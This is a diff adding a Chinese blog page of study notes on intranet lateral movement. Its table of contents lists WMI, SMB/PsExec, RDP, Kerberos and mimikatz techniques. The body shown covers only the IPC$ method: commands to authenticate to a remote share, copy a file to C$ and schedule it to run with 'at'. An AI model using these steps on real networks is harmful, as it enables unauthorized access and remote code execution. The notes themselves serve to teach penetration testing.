@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon-package/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon-package/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon-package/favicon-16x16.png">
+  <link rel="mask-icon" href="/assets/images/favicon-package/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">
+  <meta name="google-site-verification" content="qIz-Tg08U6gyN_53z89yii0ZmKx2avfsO-iyOWhsRx8">
+  <meta name="msvalidate.01" content="096F3D01D2AA04148F10750CD4566535">
+  <meta name="yandex-verification" content="43f790b7e38394a4">
+  <meta name="baidu-site-verification" content="codeva-LMZoUaXjJl">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"loli.fj.cn","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"manual"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言内网渗透横向移动学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【笔记】横向移动">
+<meta property="og:url" content="https://loli.fj.cn/2024/11/12/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="57uv6Z6g55qE5Y2a5a6i">
+<meta property="og:description" content="前言内网渗透横向移动学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://loli.fj.cn/images/20241112152147/01.webp">
+<meta property="article:published_time" content="2024-11-12T07:21:47.000Z">
+<meta property="article:modified_time" content="2025-10-25T07:39:44.963Z">
+<meta property="article:author" content="57uv6Z6g">
+<meta property="article:tag" content="Github">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://loli.fj.cn/images/20241112152147/01.webp">
+
+
+<link rel="canonical" href="https://loli.fj.cn/2024/11/12/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://loli.fj.cn/2024/11/12/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/","path":"2024/11/12/横向移动/","title":"【笔记】横向移动"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【笔记】横向移动 | 57uv6Z6g55qE5Y2a5a6i</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="981ed5a0-eea5-4426-a8a9-c16a789ccc3f" src="https://umami.loli.fj.cn/script.js" data-host-url="https://umami.loli.fj.cn/"></script>
+
+
+  
+  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
+  <script src="/lib/pangu/dist/browser/pangu.umd.js" integrity="sha256-erngBMP3zzoIM6eqQ8dmrReh2vqCRgWmORroIfVoDlE=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="57uv6Z6g55qE5Y2a5a6i" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">57uv6Z6g55qE5Y2a5a6i</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">MS4wLjABAAAA5qMD8Gzdcgq7HXUOviKB59i0-ybJ59jJvNzyaPt5XOsVNqP6DU7WLcoAXvdxvYdp💗<br><font color="red">本站所有文章仅作技术研究，请勿非法破坏，请遵守相关法律法规，后果自负</font></p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-reward"><a href="/reward/" rel="section"><i class="fa fa-hand-holding-heart fa-fw"></i>赞助</a></li><li class="menu-item menu-item-command"><a href="/command/" rel="section"><i class="fa fa-book fa-fw"></i>指令</a></li><li class="menu-item menu-item-contribute"><a href="/contribute/" rel="section"><i class="fa fa-chart-line fa-fw"></i>贡献</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>订阅</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IPC%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">2.</span> <span class="nav-text">IPC横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.</span> <span class="nav-text">查看已建立的远程连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.2.</span> <span class="nav-text">建立远程连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%AD%E5%BC%80%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.3.</span> <span class="nav-text">断开已建立的远程连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%AD%E5%BC%80%E6%8C%87%E5%AE%9AIP%E5%9C%B0%E5%9D%80%E7%9A%84%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.3.1.</span> <span class="nav-text">断开指定IP地址的已建立的远程连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%AD%E5%BC%80%E6%89%80%E6%9C%89%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.3.2.</span> <span class="nav-text">断开所有已建立的远程连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%91%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%8F%91%E9%80%81%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.</span> <span class="nav-text">向远程连接发送文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.1.</span> <span class="nav-text">查看远程的文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4"><span class="nav-number">2.5.</span> <span class="nav-text">获取当前时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.6.</span> <span class="nav-text">远程创建计划任务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-%E7%89%88%E6%9C%AC-Windows-Server-2012"><span class="nav-number">2.6.1.</span> <span class="nav-text">Windows 版本 &lt; Windows Server 2012</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87at%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.6.1.1.</span> <span class="nav-text">通过at创建计划任务</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-%E7%89%88%E6%9C%AC-Windows-Server-2012-1"><span class="nav-number">2.6.2.</span> <span class="nav-text">Windows 版本 &gt;&#x3D; Windows Server 2012</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87schtasks%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.6.2.1.</span> <span class="nav-text">通过schtasks创建计划任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.6.2.2.</span> <span class="nav-text">立即执行计划任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.6.2.3.</span> <span class="nav-text">删除计划任务</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">3.</span> <span class="nav-text">WMI横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wmic"><span class="nav-number">3.1.</span> <span class="nav-text">wmic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmiexec-vbs"><span class="nav-number">3.2.</span> <span class="nav-text">wmiexec.vbs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">4.</span> <span class="nav-text">SMB横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Services"><span class="nav-number">4.1.</span> <span class="nav-text">Services</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.1.1.</span> <span class="nav-text">创建服务</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">明文连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%86%E6%96%87%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.1.1.2.</span> <span class="nav-text">密文连接</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.1.2.</span> <span class="nav-text">运行服务</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%98%8E%E6%96%87%E8%BF%9E%E6%8E%A5-1"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">明文连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%86%E6%96%87%E8%BF%9E%E6%8E%A5-1"><span class="nav-number">4.1.2.2.</span> <span class="nav-text">密文连接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PsExec"><span class="nav-number">4.2.</span> <span class="nav-text">PsExec</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96"><span class="nav-number">4.2.1.</span> <span class="nav-text">下载依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">4.2.2.</span> <span class="nav-text">横向移动</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDP%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">5.</span> <span class="nav-text">RDP横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1"><span class="nav-number">5.1.</span> <span class="nav-text">横向移动</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">6.</span> <span class="nav-text">Kerberos横向移动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87"><span class="nav-number">6.1.</span> <span class="nav-text">寻找目标</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87PowerShell%E5%AF%BB%E6%89%BE%E7%9B%AE%E6%A0%87"><span class="nav-number">6.1.1.</span> <span class="nav-text">通过PowerShell寻找目标</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E5%90%AF%E7%94%A8%E7%9A%84Windows%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.1.1.1.</span> <span class="nav-text">查看域内主机启用的Windows服务</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AD%9B%E9%80%89"><span class="nav-number">6.1.1.1.1.</span> <span class="nav-text">筛选</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">6.1.1.2.</span> <span class="nav-text">建立连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%87%AD%E6%8D%AE"><span class="nav-number">6.1.1.3.</span> <span class="nav-text">查看凭据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87Rubeus"><span class="nav-number">6.1.2.</span> <span class="nav-text">通过Rubeus</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="nav-number">6.1.2.1.</span> <span class="nav-text">下载源码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87VisualStudio%E7%BC%96%E8%AF%91%E6%BA%90%E7%A0%81"><span class="nav-number">6.1.2.2.</span> <span class="nav-text">通过VisualStudio编译源码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%87%AD%E6%8D%AE%E7%9A%84%E5%8A%A0%E5%AF%86%E5%8D%8F%E8%AE%AE%E4%B8%BARC4%E7%9A%84%E7%9B%AE%E6%A0%87"><span class="nav-number">6.1.2.3.</span> <span class="nav-text">判断凭据的加密协议为RC4的目标</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%87%AD%E6%8D%AE-1"><span class="nav-number">6.1.2.4.</span> <span class="nav-text">查看凭据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87mimikatz%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE"><span class="nav-number">6.2.</span> <span class="nav-text">通过mimikatz导出凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%87%AD%E6%8D%AE"><span class="nav-number">6.3.</span> <span class="nav-text">暴力破解凭据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E4%BE%9D%E8%B5%96-1"><span class="nav-number">6.3.1.</span> <span class="nav-text">下载依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">6.3.2.</span> <span class="nav-text">暴力破解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%88%90"><span class="nav-number">7.</span> <span class="nav-text">完成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">8.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="57uv6Z6g"
+      src="/assets/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">57uv6Z6g</p>
+  <div class="site-description" itemprop="description">5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:00-isomer-cabbies@icloud.com" title="E-Mail → mailto:00-isomer-cabbies@icloud.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/LittleSweetCookie" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;LittleSweetCookie" rel="noopener me" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+<div id="aplayer-app"></div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://loli.fj.cn/2024/11/12/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/assets/images/avatar.gif">
+      <meta itemprop="name" content="57uv6Z6g">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="57uv6Z6g55qE5Y2a5a6i">
+      <meta itemprop="description" content="5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【笔记】横向移动 | 57uv6Z6g55qE5Y2a5a6i">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【笔记】横向移动
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-11-12 15:21:47" itemprop="dateCreated datePublished" datetime="2024-11-12T15:21:47+08:00">2024-11-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-25 15:39:44" itemprop="dateModified" datetime="2025-10-25T15:39:44+08:00">2025-10-25</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内网渗透横向移动学习笔记</p>
+<span id="more"></span>
+
+<h2 id="IPC横向移动"><a href="#IPC横向移动" class="headerlink" title="IPC横向移动"></a>IPC横向移动</h2><h3 id="查看已建立的远程连接"><a href="#查看已建立的远程连接" class="headerlink" title="查看已建立的远程连接"></a>查看已建立的远程连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use</span><br></pre></td></tr></table></figure>
+
+<h3 id="建立远程连接"><a href="#建立远程连接" class="headerlink" title="建立远程连接"></a>建立远程连接</h3><ul>
+<li>通过<code>IPC$</code>共享文件夹建立远程连接</li>
+</ul>
+<blockquote>
+<p><code>&lt;ip&gt;</code>：远程IP地址<br><code>&lt;username&gt;</code>：用户名<br><code>&lt;password&gt;</code>：密码</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$ &lt;password&gt; /user:&lt;username&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>&lt;domain&gt;</code>：域名</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$ &lt;password&gt; /user:&lt;domain&gt;\&lt;username&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="断开已建立的远程连接"><a href="#断开已建立的远程连接" class="headerlink" title="断开已建立的远程连接"></a>断开已建立的远程连接</h3><h4 id="断开指定IP地址的已建立的远程连接"><a href="#断开指定IP地址的已建立的远程连接" class="headerlink" title="断开指定IP地址的已建立的远程连接"></a>断开指定IP地址的已建立的远程连接</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt; /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="断开所有已建立的远程连接"><a href="#断开所有已建立的远程连接" class="headerlink" title="断开所有已建立的远程连接"></a>断开所有已建立的远程连接</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use * /<span class="built_in">del</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="向远程连接发送文件"><a href="#向远程连接发送文件" class="headerlink" title="向远程连接发送文件"></a>向远程连接发送文件</h3><blockquote>
+<p><code>c$</code>：复制文件到C盘根文件夹</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> &lt;file&gt; \\&lt;ip&gt;\c$</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看远程的文件"><a href="#查看远程的文件" class="headerlink" title="查看远程的文件"></a>查看远程的文件</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\&lt;ip&gt;\c$</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取当前时间"><a href="#获取当前时间" class="headerlink" title="获取当前时间"></a>获取当前时间</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="远程创建计划任务"><a href="#远程创建计划任务" class="headerlink" title="远程创建计划任务"></a>远程创建计划任务</h3><h4 id="Windows-版本-Windows-Server-2012"><a href="#Windows-版本-Windows-Server-2012" class="headerlink" title="Windows 版本 &lt; Windows Server 2012"></a>Windows 版本 &lt; Windows Server 2012</h4><h5 id="通过at创建计划任务"><a href="#通过at创建计划任务" class="headerlink" title="通过at创建计划任务"></a>通过at创建计划任务</h5><blockquote>
+<p><code>\\&lt;ip&gt;</code>：指定目标IP地址<br><code>00:00</code>：任务执行的时间，小时:分钟<br><code>c:\&lt;file&gt;</code>：任务执行的可执行程序</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> \\&lt;ip&gt; <span class="number">00</span>:<span class="number">00</span> c:\&lt;file&gt;</span><br></pre></td></tr></table></figure>
+
